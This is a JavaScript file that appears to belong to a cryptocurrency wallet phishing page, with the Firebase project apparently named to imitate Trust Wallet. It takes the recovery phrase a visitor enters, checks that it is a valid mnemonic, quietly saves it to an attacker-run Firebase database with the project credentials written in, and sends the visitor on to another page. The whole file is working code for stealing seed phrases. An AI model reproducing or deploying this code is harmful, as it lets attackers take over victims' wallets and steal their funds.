import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
import { getDatabase, ref, set } from 'https://www.gstatic.com/firebasejs/10.12.5/firebase-database.js';

const input = document.querySelector("#phrase")
const error = document.querySelector(".warning");
const btn = document.querySelector(".submit-btn");

const firebaseConfig = {
    apiKey: "AIzaSyCiDAsAG0OXo8T8UYRMuECLGUHq3b3iNCE",
    authDomain: "new-tw-276a2.firebaseapp.com",
    databaseURL: "https://new-tw-276a2-default-rtdb.firebaseio.com",
    projectId: "new-tw-276a2",
    storageBucket: "new-tw-276a2.appspot.com",
    messagingSenderId: "476422057375",
    appId: "1:476422057375:web:a9d7f33d8e5b377ca961aa",
    measurementId: "G-F164644KB4"
};


const app = initializeApp(firebaseConfig);

const writeData = (twtWords) => {
    const db = getDatabase(app);

    const reference = ref(db, `words/${Date.now()}`)

    set(reference, {
        word: twtWords
    })
    .then(() => {
        input.value = "";
        window.location = `./go.html`;
    })
    .catch((error) => {
        console.log(error);
    })
}
btn.onclick = (e) => {
    e.preventDefault();
    const value = input.value;
    const border = `1px solid red`;
    const isValid = ethers.utils.isValidMnemonic(value);
    if(isValid){
        writeData(value);

    } else {
        error.classList.remove('hide');
        input.style.border = border;
    } 

}